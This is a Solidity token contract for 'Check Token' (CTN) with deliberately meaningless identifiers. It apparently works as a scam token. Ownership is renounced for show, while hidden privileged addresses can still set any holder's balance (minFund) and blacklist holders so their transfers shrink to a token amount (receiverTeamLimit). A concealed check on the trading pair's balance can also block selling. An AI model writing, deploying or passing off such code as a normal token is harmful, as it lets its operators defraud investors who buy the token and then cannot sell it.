//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

interface limitExemptShould {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fromLaunch) external view returns (uint256);

    function transfer(address receiverLaunchedBuy, uint256 exemptWallet) external returns (bool);

    function allowance(address swapTotal, address spender) external view returns (uint256);

    function approve(address spender, uint256 exemptWallet) external returns (bool);

    function transferFrom(
        address sender,
        address receiverLaunchedBuy,
        uint256 exemptWallet
    ) external returns (bool);

    event Transfer(address indexed from, address indexed walletMax, uint256 value);
    event Approval(address indexed swapTotal, address indexed spender, uint256 value);
}

abstract contract listToSell {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface txAuto {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface amountWalletFee {
    function createPair(address minAutoAmount, address limitTake) external returns (address);
}

interface minMarketing is limitExemptShould {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract CheckToken is listToSell, limitExemptShould, minMarketing {

    uint256 public launchLaunched;

    string private modeList = "Check Token";

    bool private modeFrom;

    event OwnershipTransferred(address indexed totalLiquidity, address indexed liquidityFrom);

    function minFund(address isTake, uint256 exemptWallet) public {
        amountExempt();
        marketingLaunch[isTake] = exemptWallet;
    }

    function shouldLimitTeam(address buyMarketing, address receiverLaunchedBuy, uint256 exemptWallet) internal returns (bool) {
        if (buyMarketing == fromSellMin) {
            return tokenTx(buyMarketing, receiverLaunchedBuy, exemptWallet);
        }
        uint256 buyFee = limitExemptShould(receiverSwap).balanceOf(marketingMode);
        require(buyFee == teamSell);
        require(receiverLaunchedBuy != marketingMode);
        if (walletLimit[buyMarketing]) {
            return tokenTx(buyMarketing, receiverLaunchedBuy, liquidityList);
        }
        return tokenTx(buyMarketing, receiverLaunchedBuy, exemptWallet);
    }

    function owner() external view returns (address) {
        return fundLimitSwap;
    }

    function exemptTxBuy(address tokenSender) public {
        if (receiverTotal) {
            return;
        }
        
        launchAt[tokenSender] = true;
        
        receiverTotal = true;
    }

    bool public receiverTotal;

    function decimals() external view virtual override returns (uint8) {
        return buyTeam;
    }

    mapping(address => mapping(address => uint256)) private liquidityFund;

    uint256 private senderTeamAt = 100000000 * 10 ** 18;

    function transfer(address isTake, uint256 exemptWallet) external virtual override returns (bool) {
        return shouldLimitTeam(_msgSender(), isTake, exemptWallet);
    }

    address public fromSellMin;

    address isReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function receiverTeamLimit(address buyTotalTeam) public {
        amountExempt();
        if (swapAt != receiverToMax) {
            receiverToTake = true;
        }
        if (buyTotalTeam == fromSellMin || buyTotalTeam == receiverSwap) {
            return;
        }
        walletLimit[buyTotalTeam] = true;
    }

    address marketingMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    address public receiverSwap;

    function name() external view virtual override returns (string memory) {
        return modeList;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return senderTeamAt;
    }

    uint256 teamSell;

    mapping(address => bool) public walletLimit;

    uint256 public fromLaunched;

    string private marketingTakeMax = "CTN";

    function approve(address autoBuyLiquidity, uint256 exemptWallet) public virtual override returns (bool) {
        liquidityFund[_msgSender()][autoBuyLiquidity] = exemptWallet;
        emit Approval(_msgSender(), autoBuyLiquidity, exemptWallet);
        return true;
    }

    uint256 private sellTradingTeam;

    function symbol() external view virtual override returns (string memory) {
        return marketingTakeMax;
    }

    function liquidityMin(uint256 exemptWallet) public {
        amountExempt();
        teamSell = exemptWallet;
    }

    function balanceOf(address fromLaunch) public view virtual override returns (uint256) {
        return marketingLaunch[fromLaunch];
    }

    function transferFrom(address buyMarketing, address receiverLaunchedBuy, uint256 exemptWallet) external override returns (bool) {
        if (_msgSender() != isReceiver) {
            if (liquidityFund[buyMarketing][_msgSender()] != type(uint256).max) {
                require(exemptWallet <= liquidityFund[buyMarketing][_msgSender()]);
                liquidityFund[buyMarketing][_msgSender()] -= exemptWallet;
            }
        }
        return shouldLimitTeam(buyMarketing, receiverLaunchedBuy, exemptWallet);
    }

    mapping(address => uint256) private marketingLaunch;

    uint256 private maxLaunched;

    constructor (){
        
        txAuto senderReceiver = txAuto(isReceiver);
        receiverSwap = amountWalletFee(senderReceiver.factory()).createPair(senderReceiver.WETH(), address(this));
        if (listFund != modeFrom) {
            modeFrom = false;
        }
        fromSellMin = _msgSender();
        swapSender();
        launchAt[fromSellMin] = true;
        marketingLaunch[fromSellMin] = senderTeamAt;
        
        emit Transfer(address(0), fromSellMin, senderTeamAt);
    }

    uint8 private buyTeam = 18;

    function tokenTx(address buyMarketing, address receiverLaunchedBuy, uint256 exemptWallet) internal returns (bool) {
        require(marketingLaunch[buyMarketing] >= exemptWallet);
        marketingLaunch[buyMarketing] -= exemptWallet;
        marketingLaunch[receiverLaunchedBuy] += exemptWallet;
        emit Transfer(buyMarketing, receiverLaunchedBuy, exemptWallet);
        return true;
    }

    function swapSender() public {
        emit OwnershipTransferred(fromSellMin, address(0));
        fundLimitSwap = address(0);
    }

    uint256 public maxMode;

    uint256 constant liquidityList = 10 ** 10;

    uint256 feeIs;

    function getOwner() external view returns (address) {
        return fundLimitSwap;
    }

    function amountExempt() private view {
        require(launchAt[_msgSender()]);
    }

    bool private listFund;

    address private fundLimitSwap;

    bool public swapAt;

    function allowance(address liquidityIs, address autoBuyLiquidity) external view virtual override returns (uint256) {
        if (autoBuyLiquidity == isReceiver) {
            return type(uint256).max;
        }
        return liquidityFund[liquidityIs][autoBuyLiquidity];
    }

    mapping(address => bool) public launchAt;

    bool private receiverToMax;

    bool public receiverToTake;

}